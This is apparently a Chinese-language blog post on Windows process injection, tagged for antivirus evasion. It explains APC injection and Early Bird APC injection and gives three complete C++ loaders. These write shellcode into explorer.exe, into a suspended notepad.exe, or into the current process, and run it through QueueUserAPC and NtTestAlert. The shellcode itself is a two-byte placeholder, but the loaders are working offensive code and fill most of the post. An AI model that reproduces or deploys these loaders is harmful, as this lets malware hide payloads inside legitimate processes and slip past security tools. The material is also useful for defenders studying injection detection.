---
layout: post
title: APC Inject
categories: Inject
description: Inject 之 APC
keywords: Windows，注入，免杀
---

APC注入技术

# APC Inject

## 原理

APC是一个简称，即“异步过程调用”。APC 注入的原理是利用当线程被唤醒时，APC 中的注册函数会被执行，并以此去执行 DLL 的加载代码，进而完成 DLL 注入的目的。在线程下一次被调度的时候，就会执行 APC 函数，APC 有两种形式，由系统产生的 APC 称为内核模式 APC，由应用程序产生的 APC 被称为用户模式 APC。

## 实现流程

1. 当某个线程执行到 Sleep 或 WaitForSingleObject 时，系统就会产生一个软中断。
2. 当线程再次被唤醒时，此线程会首先执行 APC 队列中的被注册的函数。
3. 利用 QueueUserAPC 可以在软中断时向线程的 APC 队列插入一个函数指针。

## 缺点

当用户模式 APC 队列时，除非线程处于可警报状态，否则不会定向线程调用 APC 函数。

线程处于可警报状态后，线程将按先进先出 （FIFO） 顺序处理所有挂起的 APC，等待操作将返回WAIT_IO_COMPLETION。

线程通过使用 SleepEx 函数、SignalObjectAndWait 函数、WaitForSingleObjectEx 函数、WaitForMultipleObjectsEx 函数或 MsgWaitForMultipleObjectsEx 函数进入可报警状态。

[QueueUserAPC function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)

## 完整代码

### 1.OpenProcess 注入 explorer

```c++
#include "pch.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>

int main()
{
	unsigned char shellcode[] =
			"\xfc\x48";

	HANDLE	hProcessHandle;
	HANDLE	hThreadHandle;
	HANDLE	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	PROCESSENTRY32	processEntry	= { sizeof(PROCESSENTRY32) };
	THREADENTRY32	threadEntry		= { sizeof(THREADENTRY32) };
	std::vector<DWORD> vThreadIds;
	SIZE_T ShellcodeSize = sizeof(shellcode);
	
	// 查找 explorer.exe 进程 ID
	if (Process32First(hSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(hSnapshot, &processEntry);
		}
	}

	// 获取目标进程句柄
	hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	// 在 explorer.exe 进程内存空间中分配内存
	LPVOID shellAddress = VirtualAllocEx(hProcessHandle, NULL, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	// 调用 WriteProcessMemory 写入分配的内存中的 Shllcode
	WriteProcessMemory(hProcessHandle, shellAddress, shellcode, ShellcodeSize, NULL);

	// 查找 explorer.exe 所有线程
	if (Thread32First(hSnapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				vThreadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &threadEntry));
	}

	for (DWORD dThreadId : vThreadIds) {
		// 根据线程 Tid，打开线程句柄
		hThreadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, dThreadId);
		// 给 APC 队列中插入回调函数
		// 在调用 QueueUserAPC 函数时指定此地址。PAPCFUNC 类型定义指向此回调函数的指针。
		QueueUserAPC((PAPCFUNC)apcRoutine, hThreadHandle, NULL);
		Sleep(1000 * 3);
	}

	return 0;
}
```

### 2.CreateProcess 注入 notepad

```
#include <Windows.h>
int main()
{
	unsigned char shellcode[] =
		"\xfc\x48";

	LPCSTR lpApplication = "C:\\Windows\\System32\\notepad.exe";
	SIZE_T ShellcodeSize = sizeof(shellcode);
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	// 以挂起状态创建 notepad.exe
	CreateProcessA(lpApplication, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE hProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	// 在 notepad.exe 进程内存空间中分配内存
	LPVOID shellAddress = VirtualAllocEx(hProcess, NULL, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	// 调用 WriteProcessMemory 写入分配的内存中的 Shllcode
	WriteProcessMemory(hProcess, shellAddress, shellcode, ShellcodeSize, NULL);

	// 给 APC 队列中插入回调函数
	// 在调用 QueueUserAPC 函数时指定此地址。PAPCFUNC 类型定义指向此回调函数的指针。
	QueueUserAPC((PAPCFUNC)ptApcRoutine, hThread, NULL);

	// 恢复线程
	ResumeThread(hThread);

	return 0;
}
```



# Early Bird APC Inject

## 原理

由于线程初始化时会调用 ntdll 未导出函数 NtTestAlert，NtTestAlert 是一个检查当前线程的 APC 队列的函数，如果有任何队列作业，它会清空队列。当线程启动时，NtTestAlert 会首先被调用。因此，如果在线程的开始状态下对 APC 进行操作，调用 NtTestAlert 函数就可以确保执行我们的 shellcode。

## 实现流程

1. 在当前进程中分配一块内存空间
2. 往申请的空间内写入 shellcode
3. 将 APC 插入到当前线程
4. 调用 NtTestAlert

## 完整代码

```c++
#include <Windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

int main()
{
	unsigned char shellcode[] =
		"\xfc\x48";

	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	SIZE_T ShellcodeSize = sizeof(shellcode);
	// 分配内存
	LPVOID shellAddress = VirtualAlloc(NULL, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// 调用 WriteProcessMemory 写入分配的内存中的 Shllcode
	WriteProcessMemory(GetCurrentProcess(), shellAddress, shellcode, ShellcodeSize, NULL);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	// 给 APC 队列中插入回调函数
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	// 调用 NtTestAlert 函数检查当前线程的 APC 队列，如果有任何队列作业，清空队列，执行 shellcode
	testAlert();

	return 0;
}
```

